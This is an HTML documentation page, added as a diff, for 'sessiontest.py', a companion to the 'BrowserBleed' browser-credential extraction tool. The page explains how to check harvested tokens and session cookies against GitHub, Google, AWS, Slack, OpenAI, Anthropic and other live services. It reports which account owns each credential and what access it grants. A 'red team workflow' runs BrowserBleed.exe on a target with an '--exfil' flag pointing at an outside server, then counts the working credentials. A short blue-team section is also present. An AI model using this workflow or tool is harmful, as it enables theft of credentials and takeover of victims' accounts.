@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BrowserBleed — sessiontest.py Guide</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiByeD0iOCIgZmlsbD0iIzBhMGMxMCIvPjxwYXRoIGQ9Ik0xNiA2QzE2IDYgOCAxNiA4IDIxYTggOCAwIDAgMCAxNiAwYzAtNS04LTE1LTgtMTV6IiBmaWxsPSIjZjg1MTQ5Ii8+PC9zdmc+">
+<style>
+:root{
+  --bg:#0a0c10;--surface:#10141a;--surface2:#13181f;--surface3:#0d1117;
+  --border:#1e2530;--border-h:#2d3748;
+  --text:#cdd5e0;--dim:#5a6478;--muted:#3d4758;
+  --accent:#4f8ef7;--green:#3fb950;--yellow:#d29922;--red:#f85149;
+  --mono:"SFMono-Regular","Cascadia Code",Consolas,monospace;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",system-ui,sans-serif;font-size:14px;line-height:1.6}
+.shell{max-width:900px;margin:0 auto;padding:40px 24px}
+.topbar{display:flex;align-items:center;border-bottom:1px solid var(--border);margin-bottom:32px;padding-top:20px;padding-bottom:20px}
+.topbar-brand{font-size:13px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--dim);padding-right:24px;border-right:1px solid var(--border)}
+.nav-link{display:inline-flex;align-items:center;gap:6px;padding:10px 16px;font-size:13px;font-weight:500;color:var(--dim);text-decoration:none;transition:color .15s}
+.nav-link:hover{color:var(--text)}
+.nav-link.active{color:var(--accent)}
+h1{font-size:28px;font-weight:600;margin-bottom:8px}
+.subtitle{color:var(--dim);font-size:14px;margin-bottom:32px}
+h2{font-size:18px;font-weight:600;margin-top:32px;margin-bottom:16px;color:var(--text)}
+h3{font-size:14px;font-weight:600;margin-top:20px;margin-bottom:12px;color:var(--text)}
+p{margin-bottom:16px;color:var(--text)}
+code{background:var(--surface3);border:1px solid var(--border);border-radius:4px;padding:2px 6px;font-family:var(--mono);font-size:12px;color:var(--accent)}
+pre{background:var(--surface3);border:1px solid var(--border);border-radius:6px;padding:14px 16px;overflow-x:auto;margin-bottom:16px}
+pre code{background:none;border:none;padding:0;color:var(--text)}
+table{width:100%;border-collapse:collapse;margin-bottom:16px}
+th{background:var(--surface);border-bottom:1px solid var(--border);padding:10px 12px;text-align:left;font-weight:600;font-size:12px;color:var(--dim);text-transform:uppercase}
+td{border-bottom:1px solid var(--border);padding:10px 12px;color:var(--text)}
+tr:last-child td{border-bottom:none}
+ul,ol{margin-left:20px;margin-bottom:16px}
+li{margin-bottom:8px}
+.note{background:var(--surface);border-left:3px solid var(--green);border-radius:4px;padding:12px 16px;margin-bottom:16px}
+.note strong{color:var(--green)}
+.example{background:var(--surface);border-radius:6px;padding:16px;margin-bottom:16px}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+@media(max-width:640px){
+  .shell{padding:20px 12px}
+  h1{font-size:22px}
+  h2{font-size:16px}
+  code{font-size:11px}
+}
+</style>
+</head>
+<body>
+<div class="shell">
+
+  <div class="topbar">
+    <span class="topbar-brand">BrowserBleed</span>
+    <a href="/guide" class="nav-link">Guide</a>
+    <a href="/payloads" class="nav-link">Payloads</a>
+  </div>
+
+  <h1>sessiontest.py — Credential Validation</h1>
+  <p class="subtitle">Test extracted credentials and cookies against live services</p>
+
+  <h2>Quick Start</h2>
+  <p>After exporting a BrowserBleed report from the server:</p>
+  <pre><code># Simplest — auto-finds latest ZIP in ~/Downloads
+python3 sessiontest.py
+
+# With browser sessions (opens Playwright)
+python3 sessiontest.py --browser
+
+# JSON output for parsing
+python3 sessiontest.py --json</code></pre>
+
+  <div class="note">
+    <strong>✓ Auto-detection:</strong> sessiontest.py automatically finds the most recent BrowserBleed report ZIP in your Downloads folder, extracts the CSV, and runs validation. No manual steps needed.
+  </div>
+
+  <h2>What It Does</h2>
+  <p>sessiontest.py makes live API requests to validate each extracted credential:</p>
+  <ul>
+    <li><strong>Tests credentials</strong> against the actual service (GitHub, Google, Anthropic, AWS, Slack, etc.)</li>
+    <li><strong>Reports identity</strong> — which user/account owns the credential</li>
+    <li><strong>Shows access</strong> — what permissions or scopes the credential grants</li>
+    <li><strong>Tests cookies</strong> — validates session cookies via redirect-check</li>
+  </ul>
+
+  <h2>Supported Services</h2>
+  <table>
+    <thead><tr><th>Service</th><th>Method</th></tr></thead>
+    <tbody>
+      <tr><td>GitHub</td><td><code>api.github.com/user</code> + org check</td></tr>
+      <tr><td>Google OAuth2</td><td><code>oauth2.googleapis.com/tokeninfo</code></td></tr>
+      <tr><td>Anthropic</td><td>API key test + web session test</td></tr>
+      <tr><td>OpenAI</td><td><code>api.openai.com/v1/models</code></td></tr>
+      <tr><td>Slack</td><td><code>slack.com/api/auth.test</code></td></tr>
+      <tr><td>Discord</td><td><code>discord.com/api/v10/users/@me</code></td></tr>
+      <tr><td>AWS</td><td>SigV4-signed GetCallerIdentity</td></tr>
+      <tr><td>Stripe</td><td><code>api.stripe.com/v1/account</code></td></tr>
+      <tr><td>HuggingFace</td><td><code>huggingface.co/api/whoami-v2</code></td></tr>
+      <tr><td>Microsoft Graph</td><td><code>graph.microsoft.com/v1.0/me</code></td></tr>
+      <tr><td>Spotify</td><td><code>api.spotify.com/v1/me</code></td></tr>
+      <tr><td>npm</td><td><code>registry.npmjs.org/-/whoami</code></td></tr>
+      <tr><td>Cookie Sessions</td><td>Redirect-check against service</td></tr>
+      <tr><td>JWT / JWE</td><td>Local exp claim validation</td></tr>
+    </tbody>
+  </table>
+
+  <h2>Usage Examples</h2>
+
+  <h3>Basic usage (auto-detect)</h3>
+  <pre><code>python3 sessiontest.py</code></pre>
+  <p>Searches for the most recent report ZIP in <code>~/Downloads</code>, extracts it, and tests all credentials.</p>
+
+  <h3>Explicit CSV file</h3>
+  <pre><code>python3 sessiontest.py /path/to/bb_results.csv</code></pre>
+
+  <h3>With browser testing</h3>
+  <pre><code>python3 sessiontest.py --browser</code></pre>
+  <p>Opens a Playwright browser to interactively test cookie sessions. Requires: <code>pip install playwright && playwright install chromium</code></p>
+
+  <h3>JSON output</h3>
+  <pre><code>python3 sessiontest.py --json</code></pre>
+  <p>Machine-readable output with full API responses for each credential.</p>
+
+  <h3>Adjust timeout and delay</h3>
+  <pre><code>python3 sessiontest.py --timeout 15 --delay 0.5</code></pre>
+  <p>Increase timeout to 15 seconds, delay between requests to 0.5 seconds (default: 10s timeout, 0.3s delay).</p>
+
+  <h3>Skip TLS verification</h3>
+  <pre><code>python3 sessiontest.py --no-verify-ssl</code></pre>
+
+  <h3>Combine flags</h3>
+  <pre><code>python3 sessiontest.py --browser --json --timeout 20</code></pre>
+
+  <h2>Auto-Detection Priority</h2>
+  <p>When no file is specified, sessiontest searches in this order:</p>
+  <ol>
+    <li><code>BB_RESULTS_CSV</code> environment variable (if set)</li>
+    <li>Most recent <code>*_YYYY-MM-DD.csv</code> in <code>~/Downloads</code></li>
+    <li><code>bb_results.csv</code> in current directory</li>
+    <li><code>bb_results.csv</code> in script directory</li>
+    <li>Most recent <code>*_YYYY-MM-DD.zip</code> in <code>~/Downloads</code> (auto-extracts)</li>
+  </ol>
+
+  <h2>Environment Variables</h2>
+  <table>
+    <thead><tr><th>Variable</th><th>Purpose</th></tr></thead>
+    <tbody>
+      <tr><td><code>BB_RESULTS_CSV</code></td><td>Explicit path to CSV file (highest priority)</td></tr>
+      <tr><td><code>BB_QUIET</code></td><td>Suppress auto-extraction messages</td></tr>
+    </tbody>
+  </table>
+
+  <div class="example">
+    <strong>Example:</strong>
+    <pre><code>export BB_RESULTS_CSV=/tmp/results.csv
+python3 sessiontest.py
+
+# Suppress output
+export BB_QUIET=1
+python3 sessiontest.py</code></pre>
+  </div>
+
+  <h2>Output Modes</h2>
+
+  <h3>Default (human-readable table)</h3>
+  <p>Colored status indicators, truncated values, summary counts:</p>
+  <ul>
+    <li><span style="color:var(--green)">✓ valid</span> — credential works</li>
+    <li><span style="color:var(--yellow)">⏱ expired</span> — token/session expired</li>
+    <li><span style="color:var(--red)">✗ invalid</span> — credential rejected (401/403)</li>
+    <li><span style="color:var(--red)">! error</span> — connection/parsing error</li>
+    <li><span style="color:var(--dim)">· info</span> — inconclusive (may or may not be valid)</li>
+  </ul>
+
+  <h3>JSON output</h3>
+  <p>Machine-readable with full API responses for parsing:</p>
+  <pre><code>{
+  "service": "GitHub",
+  "label": "GitHub token",
+  "status": "valid",
+  "identity": "andrew (andrewhannaford)",
+  "access": "5 public repos  private repos ✓  orgs: my-org"
+}</code></pre>
+
+  <h2>Common Workflows</h2>
+
+  <h3>Red team workflow</h3>
+  <div class="example">
+    <pre><code># 1. Run BrowserBleed on target
+./BrowserBleed.exe --exfil https://reports.yourdomain.com --exfil-key KEY
+
+# 2. Download report from server (saves as ZIP to ~/Downloads)
+# 3. Run validation on your machine
+python3 sessiontest.py --json > results.json
+
+# 4. Parse results for live credentials
+grep '"status": "valid"' results.json | wc -l</code></pre>
+  </div>
+
+  <h3>Blue team / detection testing</h3>
+  <div class="example">
+    <pre><code># Test with your own valid tokens to understand the tool
+echo "ghp_YOURTOKEN" > test.csv
+sessiontest.py test.csv --timeout 30</code></pre>
+  </div>
+
+</div>
+</body>
+</html>
